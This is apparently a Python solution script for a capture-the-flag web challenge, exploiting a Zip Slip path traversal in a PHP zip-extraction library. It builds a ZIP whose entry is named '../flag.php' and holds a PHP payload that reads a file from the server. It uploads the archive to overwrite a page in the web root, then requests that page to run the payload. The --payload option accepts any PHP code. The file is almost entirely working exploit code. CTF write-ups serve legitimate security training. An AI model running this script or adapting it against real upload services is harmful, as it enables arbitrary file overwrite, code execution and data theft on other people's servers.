#!/usr/bin/env python3
"""
Solution script for "Free Cloud Storage" — tjCTF 2026
Vulnerability: Zip Slip (path traversal) in chumper/zipper v1.0.2

Steps:
  1.  Create a malicious ZIP archive whose internal entry is named
      `../flag.php`.  PHP's ZipArchive (which Zipper wraps) does *not*
      canonicalise entry names, so the library writes the extracted
      file at `$dest/../flag.php` — i.e. it overwrites the real
      flag.php in the web root.
  2.  Upload the ZIP to the target's upload form.
  3.  Visit /flag.php — our payload now executes and reveals the flag.
"""

import argparse
import io
import sys
import zipfile

import requests

PAYLOAD = """\
<?php
echo file_get_contents("/var/www/html/flag.txt");
"""

TARGET_UPLOAD = "upload.php"
TARGET_FLAG = "flag.php"
TRAVERSAL_PATH = "../flag.php"


def build_zip(payload: str, entry_name: str = TRAVERSAL_PATH) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(entry_name, payload)
    return buf.getvalue()


def main():
    parser = argparse.ArgumentParser(
        description="Zip Slip exploit for Free Cloud Storage"
    )
    parser.add_argument("base_url", help="Base URL of the challenge (e.g. https://free-cloud-storage-xxx.tjc.tf)")
    parser.add_argument("--payload", default=PAYLOAD, help="PHP payload to inject")
    parser.add_argument("--entry", default=TRAVERSAL_PATH, help="ZIP entry path with traversal")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    # 1. Upload the malicious ZIP
    zip_data = build_zip(args.payload, args.entry)
    print(f"[*] Uploading ZIP  ({args.entry}) ...")
    r = requests.post(
        f"{base}/{TARGET_UPLOAD}",
        files={"zipfile": ("pwn.zip", zip_data, "application/zip")},
    )
    if r.status_code != 200:
        print(f"[-] Upload failed: HTTP {r.status_code}")
        sys.exit(1)
    print("[+] Upload OK")

    # 2. Retrieve the flag from the overwritten flag.php
    print(f"[*] Fetching /{TARGET_FLAG} ...")
    r = requests.get(f"{base}/{TARGET_FLAG}")
    if r.status_code != 200:
        print(f"[-] Fetch failed: HTTP {r.status_code}")
        sys.exit(1)

    flag = r.text.strip()
    print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
